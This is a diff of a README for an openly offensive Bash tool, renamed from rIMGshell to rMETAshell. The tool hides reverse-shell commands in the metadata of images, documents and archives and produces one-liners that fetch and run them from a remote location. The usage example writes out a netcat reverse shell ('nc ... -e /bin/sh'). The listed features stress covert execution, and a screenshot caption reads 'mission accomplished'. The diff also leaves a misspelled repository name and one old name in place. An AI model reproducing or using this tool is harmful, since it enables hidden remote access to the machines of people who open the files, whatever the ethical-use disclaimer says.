@@ -1,15 +1,15 @@
-# rIMGshell
+# rMETAshell
 [![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-red)](https://github.com/sponsors/git5loxosec) [![Kali Linux Compatible](https://img.shields.io/badge/Kali%20Linux-Compatible-brightgreen)](https://www.kali.org/)
  <img src="https://camo.githubusercontent.com/f25217d6db3b6cb603d9fb4a2b017a682aae3b1ec5c6ffab653f6cd31eceb73c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446576656c6f7065642532306f6e2d6b616c692532306c696e75782d626c756576696f6c6574"> 
  ![Language](https://img.shields.io/badge/Language-Bash-green.svg)
  ![License](https://img.shields.io/badge/License-MIT-blue.svg) 
 
 
-<img src="https://github.com/git5loxosec/rIMGshell/blob/main/github_rimgshell1.png">
+<img src="https://github.com/git5loxosec/rMRTAshell/blob/main/github_rimgshell1.png">
 Clean image file no reverse shell.
-<img src="https://github.com/git5loxosec/rIMGshell/blob/main/github_rimgshell2.png">
+<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell2.png">
 The reverse shell injection method used here wont affect the integrity of the image file.
-<img src="https://github.com/git5loxosec/rIMGshell/blob/main/github_rimgshell3.png">
+<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell3.png">
 Connection established, mission accomplished!
 
 
@@ -19,10 +19,10 @@ Supports jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, ppt
 
 # Description:
 
-rIMGshell is a command-line tool for injecting a reverse shell command into an image and generating one-liner execution methods.
+rMETAshell is a command-line tool for injecting a reverse shell command into the metadata and generating one-liner execution methods.
 
 # How It Works:
-rIMGshell takes a reverse shell command and an image file as input. It then injects the command into the image using metadata comments. After injection, it generates a one-liner execution method for retrieving and executing the injected command from a remote location.
+rMETAshell takes a reverse shell command and an image file as input. It then injects the command into the image using metadata comments. After injection, it generates a one-liner execution method for retrieving and executing the injected command from a remote location.
 
 # Features:
 Covert Command Injection: Inject reverse shell commands into image files.
@@ -35,25 +35,25 @@ Secure Communication: Execute commands remotely without revealing their presence
 1. Clone the repository:
 
    ```
-   git clone https://github.com/git5loxosec/rIMGshell
+   git clone https://github.com/git5loxosec/rMETAshell
    ```
 
 2. Change to the project directory:
 
    ```
-   cd rIMGshell
+   cd rMETAshell
    ```
 
 3. Make the script executable:
 
    ```
-   chmod +x rIMGshell.sh
+   chmod +x rMETAshell.sh
    ```
 
 ## Usage
 
 ```
-./rIMGshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>
+./rMETAshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>
 ```
 
 - `[OPTIONS]` - Optional arguments.
@@ -63,13 +63,13 @@ Secure Communication: Execute commands remotely without revealing their presence
 **Example:**
 
 ```
-./rIMGshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
+./rMETAshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
 ```
 
-Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rIMGshell.
+Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rMETAshell.
 
 **Warning: Ethical and Responsible Use Only
-rIMGshell is intended for legitimate and ethical purposes, such as penetration testing, cybersecurity assessments, and educational use. Unauthorized use of this tool for malicious activities is strictly prohibited and may have serious legal consequences. Ensure that you have proper authorization and adhere to all applicable laws and regulations before using rIMGshell.**
+rMETAshell is intended for legitimate and ethical purposes, such as penetration testing, cybersecurity assessments, and educational use. Unauthorized use of this tool for malicious activities is strictly prohibited and may have serious legal consequences. Ensure that you have proper authorization and adhere to all applicable laws and regulations before using rIMGshell.**
 
 
 ## License
